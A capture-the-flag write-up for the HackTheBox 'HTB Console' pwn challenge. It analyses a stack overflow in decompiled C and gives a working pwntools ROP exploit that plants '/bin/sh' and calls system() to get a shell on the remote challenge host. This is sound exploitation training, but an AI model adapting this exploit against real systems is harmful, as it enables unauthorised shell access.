---

title: HTB [HTB CONSOLE] [PWN]

date: 2022-06-03 08:28:05 +0200

categories: [pwn,htb]

tags: [Intro to Binary Exploitation]

excerpt: Write up for the challenge "HTB Console" from HackTheBox
---

**Analysis:**

```css
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

**main()**
```c
void main(void)

{
  char local_18 [16];
  
  FUN_00401196();
  puts("Welcome HTB Console Version 0.1 Beta.");
  do {
    printf(">> ");
    fgets(local_18,0x10,stdin);
    FUN_00401201(local_18);
    memset(local_18,0,0x10);
  } while( true );
}
```
- main function gets our input and sends it to `FUN_00401201()`


**FUN_00401201()**
```c

void FUN_00401201(char *param_1)

{
  int iVar1;
  char local_18 [16];
  
  iVar1 = strcmp(param_1,"id\n");
  if (iVar1 == 0) {
    puts("guest(1337) guest(1337) HTB(31337)");
  }
  else {
    iVar1 = strcmp(param_1,"dir\n");
    if (iVar1 == 0) {
      puts("/home/HTB");
    }
    else {
      iVar1 = strcmp(param_1,"flag\n");
      if (iVar1 == 0) {
        printf("Enter flag: ");
        fgets(local_18,0x30,stdin);
        puts("Whoops, wrong flag!");
      }
      else {
        iVar1 = strcmp(param_1,"hof\n");
        if (iVar1 == 0) {
          puts("Register yourself for HTB Hall of Fame!");
          printf("Enter your name: ");
          fgets(&DAT_004040b0,10,stdin);
          puts("See you on HoF soon! :)");
        }
        else {
          iVar1 = strcmp(param_1,"ls\n");
          if (iVar1 == 0) {
            puts("- Boxes");
            puts("- Challenges");
            puts("- Endgames");
            puts("- Fortress");
            puts("- Battlegrounds");
          }
          else {
            iVar1 = strcmp(param_1,"date\n");
            if (iVar1 == 0) {
              system("date");
            }
            else {
              puts("Unrecognized command.");
            }
          }
        }
      }
    }
  }
  return;
}
```

- If we enter certain strings it'll give some command like outputs, but if we enter date, it actually executes system command 'date' and gives us output
- Also there's a buffer overflow in 'flag' option
```c
char local_18 [16]
fgets(local_18,0x30,stdin)
```
- but there's no useful functions are there
- So we can't able to get flag easily


**Exploit strategy:**
- There's system function, so we can use that latter
- But we need `/bin/sh` in argument
- So let's use pop rdi to put that value
- We can't directly put that string in rdi gadget, we need to put address of that string, So we need to store that in a place
- We have several inputs, let's store `/bin/sh` in any one of that and point that address in rdi
- Now time to write our exploit


**Exploit script:**

```python
from pwn import *

elf = context.binary = ELF("./htb-console")
p = elf.process()
p = remote('159.65.19.24',30324)
rop = ROP(elf)

p.sendline('hof')
p.sendline('/bin/sh')
p.sendline('flag')

payload = b'A'*24 # junk
payload += p64(rop.find_gadget(['pop rdi','ret'])[0])
payload += p64(0x004040b0) # pointer to /bin/sh
payload += p64(elf.sym['system']) # calling system

p.sendline(payload)
p.interactive()
```

![](https://i.imgur.com/tdkEeka.png)
- Cool we got our flag

